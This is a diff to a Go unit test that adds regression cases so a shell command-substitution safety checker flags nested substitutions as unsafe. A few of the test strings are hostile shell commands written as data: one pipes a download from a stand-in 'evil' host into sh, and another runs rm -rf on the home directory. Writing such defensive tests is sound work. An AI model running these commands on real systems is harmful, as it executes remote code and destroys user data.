@@ -127,6 +127,16 @@ func TestHasUnsafeCommandSubstitution(t *testing.T) {
 		// Regression guards: previously-safe forms must remain safe.
 		{"$(cat VERSION)", false},
 		{"$(git rev-parse --show-toplevel)", false},
+		// pg2-1q5i3: a nested command/process substitution inside a "safe" reader
+		// is NOT statically safe (the naive classifier wrongly approved these).
+		{"$(cat $(malicious))", true},
+		{"$(cat $(curl evil|sh))", true},
+		{"$(cat `malicious`)", true},
+		{"$(cat <(rm -rf ~))", true}, // depth-counter truncation case
+		{"$(grep x <(dangerous))", true},
+		{"$(cat >(dangerous))", true},
+		{"$(cat $(cat $(malicious)))", true},
+		{"$(cat $(mktemp))", true}, // nested → not statically safe (engine defers to Abstain)
 	}
 	for _, tt := range tests {
 		if got := HasUnsafeCommandSubstitution(tt.in); got != tt.want {
